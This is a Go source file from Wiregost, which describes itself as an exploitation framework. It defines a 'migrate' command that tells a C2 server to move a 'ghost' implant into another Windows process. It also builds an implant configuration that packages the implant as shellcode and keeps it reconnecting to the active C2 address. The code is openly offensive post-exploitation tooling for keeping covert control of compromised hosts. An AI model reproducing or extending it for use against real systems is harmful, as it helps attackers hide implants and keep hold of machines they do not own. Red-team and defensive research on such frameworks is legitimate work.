// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package proc

import (
	"fmt"
	"time"

	"github.com/gogo/protobuf/proto"

	. "github.com/maxlandon/wiregost/client/commands"
	"github.com/maxlandon/wiregost/client/constants"
	"github.com/maxlandon/wiregost/client/spin"
	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
)

type MigrateCmd struct {
	Positional struct {
		PID int `long:"pid" description:"Process ID" required:"1"`
	} `positional-args:"yes" required:"yes"`
}

var Migrate MigrateCmd

func RegisterMigrate() {
	GhostParser.AddCommand(constants.Migrate, "", "", &Migrate)

	pd := GhostParser.Find(constants.Migrate)
	pd.ShortDescription = "(Windows only) Migrate the ghost implant to a different process"
	pd.Args()[0].RequiredMaximum = 1
}

func (m *MigrateCmd) Execute(args []string) error {

	var pid = m.Positional.PID

	config := getActiveGhostConfig(Context)
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MigrateReq{
		Pid:     uint32(pid),
		Config:  config,
		GhostID: Context.Ghost.ID,
	})
	resp := <-Context.Server.RPC(&ghostpb.Envelope{
		Type: clientpb.MsgMigrate,
		Data: data,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf(Success+"Successfully migrated to %d\n", pid)
	}

	return nil
}

func getActiveGhostConfig(ctx ShellContext) *clientpb.GhostConfig {
	ghost := *ctx.Ghost
	c2s := []*clientpb.GhostC2{}
	c2s = append(c2s, &clientpb.GhostC2{
		URL:      ghost.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.GhostConfig{
		GOOS:   ghost.GetOS(),
		GOARCH: ghost.GetArch(),
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.GhostConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}
